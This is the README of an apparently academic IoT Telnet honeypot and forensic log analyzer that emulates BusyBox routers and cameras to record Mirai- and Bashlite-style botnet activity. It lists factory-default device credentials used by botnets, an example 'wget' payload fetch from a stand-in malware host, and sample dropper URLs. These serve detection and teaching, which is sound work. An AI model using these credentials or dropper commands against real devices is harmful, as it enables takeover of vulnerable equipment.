# 🛡️ IoT Telnet Honeypot & Attack Log Analyzer

A lightweight, low-interaction **IoT Telnet Honeypot** designed to capture, record, and analyze credential brute-forcing attacks and malicious shell command chains typical of IoT botnets (such as **Mirai**, **Bashlite/Gafgyt**, **Qbot**, and **Hajime**).

---

## 📌 Project Overview

Internet of Things (IoT) devices such as routers, DVRs, and IP cameras are continuously targeted by automated botnet scanners using default or weak Telnet credentials. Once authenticated, botnets execute reconnaissance commands, identify the device's CPU architecture, download binary payloads, and kill competing malware.

This project simulates a vulnerable embedded Linux system (e.g., BusyBox router or IP camera) without executing any commands on the host machine. It logs attacker interactions, identifies threat signatures, and provides a forensic log analyzer with both CLI summaries and an interactive HTML report.

### Key Capabilities
- **RFC 854 Telnet Protocol Simulation**: Handles Telnet control negotiations (`IAC WILL ECHO`, `IAC DO SGA`).
- **IoT Device Profiles**: Switch between emulated devices (`busybox_router`, `ip_camera`, `dahua_dvr`).
- **Low-Interaction Shell Emulator**: Safely responds to typical botnet commands (`cat /proc/mounts`, `cat /proc/cpuinfo`, `ps`, `wget`, `chmod`) with realistic simulated output.
- **Threat Signature Engine**: Automatically attributes commands to known botnet behaviors (Mirai shell escapes, payload droppers, rival process killers).
- **Dual Persistent Storage**: Logs structured events into **SQLite** (`logs/honeypot.db`) and **JSON Lines** (`logs/honeypot_events.jsonl`) for SIEM/ELK compatibility.
- **Forensic Analyzer & Interactive Dashboard**: Generates comprehensive CLI reports and a dark-mode HTML dashboard (`reports/honeypot_report.html`) with embedded charts.
- **Built-in Attack Simulator**: Test the honeypot immediately with realistic Mirai and Bashlite attack chains without exposing your machine to the internet.

---

## 📂 Project Structure

```text
CyberSecurityProject/
├── honeypot/
│   ├── __init__.py
│   ├── config.py              # Configuration (ports, profiles, timeouts, paths)
│   ├── logger.py              # Thread-safe logging (SQLite, JSONL, console)
│   ├── shell_emulator.py      # Low-interaction BusyBox shell emulation
│   ├── signatures.py          # Threat heuristics & IoT botnet signatures
│   └── telnet_server.py       # RFC 854 Telnet socket server & session handler
├── logs/
│   ├── honeypot.db            # Relational SQLite database of sessions & attacks
│   ├── honeypot_events.jsonl  # Structured JSON Lines log
│   └── honeypot.log           # Human-readable execution log
├── reports/
│   └── honeypot_report.html   # Generated forensic dashboard with charts
├── tests/
│   └── test_honeypot.py       # Automated unit & integration tests
├── honeypot.py                # Main server entrypoint
├── analyzer.py                # Log analysis and HTML report generator
├── simulate_attack.py         # Multi-scenario IoT botnet attack harness
├── requirements.txt           # Dependencies (standard library with optional styling)
└── README.md                  # Project documentation
```

---

## ⚙️ Prerequisites & Installation

### 1. Prerequisites
- **Python 3.8 or higher** installed. Check with:
  ```bash
  python --version
  ```

### 2. Setup (Windows, macOS, or Linux)
1. Open a terminal or command prompt in the project directory:
   ```bash
   cd CyberSecurityProject
   ```

2. *(Optional but recommended)* Create and activate a virtual environment:
   - **Windows (PowerShell):**
     ```powershell
     python -m venv venv
     .\venv\Scripts\Activate.ps1
     ```
   - **macOS / Linux:**
     ```bash
     python3 -m venv venv
     source venv/bin/activate
     ```

3. Install optional dependencies:
   ```bash
   pip install -r requirements.txt
   ```
   *(Note: The core honeypot is designed to run purely on Python's built-in standard library with zero external dependencies required).*

---

## 🚀 Quick Start Guide (3 Simple Steps)

### Step 1: Start the Honeypot Server
Open your first terminal and run:
```bash
python honeypot.py
```
*By default, the honeypot listens on **port 2323** (which does not require administrator privileges).*

### Step 2: Simulate IoT Botnet Attacks
Open a second terminal and fire the built-in attack simulator:
```bash
python simulate_attack.py
```
This executes 4 real-world attack scenarios:
1. **Mirai Botnet**: Brute-forces default credentials (`root:xc3511`), breaks out of shell (`enable`, `system`), inspects writable partitions and CPU architecture, and attempts payload drop.
2. **Bashlite / Gafgyt**: Injects competitive botnet killers (`killall -9 telnetd`), drops `gafgyt.arm`, and cleans history.
3. **IP Camera Scanner**: Probes default Xiongmai/Dahua credentials (`root:888888`) and executes system reconnaissance.
4. **Hajime Stealth Dropper**: Delivers fileless raw binary bytes via `echo -ne`.

### Step 3: Analyze Captured Logs & Generate Report
In your terminal, run:
```bash
python analyzer.py
```
This prints a forensic summary in your console and automatically generates the interactive HTML dashboard at:
`reports/honeypot_report.html`

Open the report in your browser to view charts, metrics, and captured attack chains:
- **Windows:** Double-click `reports\honeypot_report.html` or run:
  ```powershell
  Start-Process reports\honeypot_report.html
  ```
- **macOS:**
  ```bash
  open reports/honeypot_report.html
  ```
- **Linux:**
  ```bash
  xdg-open reports/honeypot_report.html
  ```

---

## 💻 Detailed Usage & Options

### Running the Honeypot (`honeypot.py`)

```text
usage: honeypot.py [-h] [--host HOST] [--port PORT] [--profile PROFILE] [--list-profiles]

options:
  -h, --help            Show this help message and exit
  --host HOST           Host address to bind (default: 0.0.0.0)
  --port PORT, -p PORT  Port number to listen on (default: 2323)
  --profile PROFILE     Emulated device profile (default: busybox_router)
  --list-profiles       List all supported device profiles and exit
```

#### Examples:
- **Run on standard Telnet port 23** *(requires root/Administrator privileges)*:
  ```bash
  python honeypot.py --port 23
  ```

- **Emulate a Dahua DVR or IP Camera**:
  ```bash
  python honeypot.py --profile dahua_dvr
  python honeypot.py --profile ip_camera
  ```

---

### Connecting Manually via Telnet Client

You can interact with your honeypot just like an attacker using any standard telnet client:

```bash
telnet localhost 2323
```
or with PuTTY (select Connection Type: **Telnet**, Host: `127.0.0.1`, Port: `2323`).

1. When prompted, enter a username and password (e.g. `root` / `admin`).
2. Explore commands:
   ```bash
   cat /proc/cpuinfo
   cat /proc/mounts
   uname -a
   ps
   wget http://malware.example.com/bot.bin
   exit
   ```
3. Watch the honeypot terminal log your commands in real time!

---

### Running the Attack Simulator (`simulate_attack.py`)

```text
usage: simulate_attack.py [-h] [--host HOST] [--port PORT] [--scenario {all,mirai,bashlite,ipcam,dropper}] [--direct]

options:
  --host HOST           Target Honeypot IP (default: 127.0.0.1)
  --port PORT, -p PORT  Target Honeypot Port (default: 2323)
  --scenario            Choose a specific scenario (mirai, bashlite, ipcam, dropper, or all)
  --direct              Direct pipeline mode (no network sockets needed; ideal for offline/firewalled tests)
```

#### Examples:
- Test only the Mirai attack chain:
  ```bash
  python simulate_attack.py --scenario mirai
  ```
- Generate logs in offline / firewall-restricted lab environments:
  ```bash
  python simulate_attack.py --direct
  ```

---

### Running the Forensic Log Analyzer (`analyzer.py`)

```text
usage: analyzer.py [-h] [--db DB] [--html] [--out OUT]

options:
  --db DB      Path to SQLite database (default: logs/honeypot.db)
  --html       Generate standalone interactive HTML report
  --out OUT    Custom output path for the HTML report
```

Example terminal output:
```text
================================================================================
          IoT TELNET HONEYPOT - FORENSIC LOG ANALYSIS REPORT
================================================================================
 Total Attack Sessions      : 4
 Unique Attacking IP Addrs  : 4
 Total Brute-Force Logins   : 6 (Accepted: 4, Rejected: 2)
 Total Injected Commands    : 27
================================================================================

[+] TOP ATTACKING IP ADDRESSES
Attacker IP   | Sessions | Last Seen Timestamp
--------------+----------+--------------------
185.156.73.12 | 1        | 2026-11-15 18:17:39
45.14.224.18  | 1        | 2026-11-15 18:17:39
103.204.180.9 | 1        | 2026-11-15 18:17:39

[+] TOP TARGETED CREDENTIAL COMBINATIONS
Credential (User:Pass) | Identified Signature           | Attempts
-----------------------+--------------------------------+---------
root : xc3511          | Mirai Default (H.264 DVR)      | 1
root : 888888          | Dahua DVR / Camera             | 1
admin : admin          | Generic Router / Switch        | 1
default : oxhlwSG8     | Mirai (Philips Hue / Embedded) | 1

[+] IDENTIFIED MALWARE DOWNLOAD URLs
Malicious URL / Dropper Location     | Attempt Count
-------------------------------------+--------------
http://185.156.73.12/bins/mirai.mips | 1
http://45.14.224.18/bins/gafgyt.arm  | 1

[+] ATTRIBUTED BOTNET FAMILIES / SIGNATURES
Botnet Family / Behavior               | Matched Commands
---------------------------------------+-----------------
Reconnaissance                         | 4
Mirai / Gafgyt                         | 4
Generic Dropper                        | 4
Multi-architecture Botnet (Mirai/Qbot) | 1
Mirai / Rival Killer                   | 1
```

---

## 🧪 Running Automated Unit Tests

Verify all components and signature detection heuristics with Python's built-in test runner:
```bash
python tests/test_honeypot.py
```
Or with `pytest` if installed:
```bash
pytest tests/
```

---

## 🔒 Security & Safety Architecture

1. **Strictly Low-Interaction**: The honeypot does **not** spawn a real Linux or Windows shell. Commands like `rm -rf`, `wget`, or `./malware` are captured purely as strings, evaluated against heuristic regular expressions, and given mock responses. No binary execution occurs on the host system.
2. **Safe Local Port**: Defaults to unprivileged port `2323`, preventing accidental interference with host services or unauthorized port binding.
3. **Structured Forensic Integrity**: Records are committed with parameterized SQL queries to prevent SQL injection in the forensic log database.

---

## 🎓 Academic Presentation & Viva Talking Points

If presenting this project for an academic defense or demonstration, highlight:
- **Why Telnet?**: Telnet communicates in plain text without encryption. Many legacy IoT devices still ship with open port 23 and factory-default credentials.
- **The Infection Lifecycle Captured**:
  1. *Scanning & Probing*: Botnets scan IPv4 subnets on port 23.
  2. *Credential Stuffing*: Automated dictionary attacks using known hardware defaults.
  3. *Shell Escalation*: Sending `enable`, `system`, or `sh` to escape menu-driven OEM shells.
  4. *Environment Fingerprinting*: Reading `/proc/cpuinfo` to match binary architectures (MIPS, ARM, x86).
  5. *Persistence & Malware Staging*: Changing to writable memory mounts (`/tmp` or `/dev/shm`) and fetching droppers.
- **Why Honeypots Matter**: Honeypots serve as early-warning intrusion detection systems, capturing zero-day dropper domains, C2 servers, and evolving dictionary wordlists before attacks hit production infrastructure.

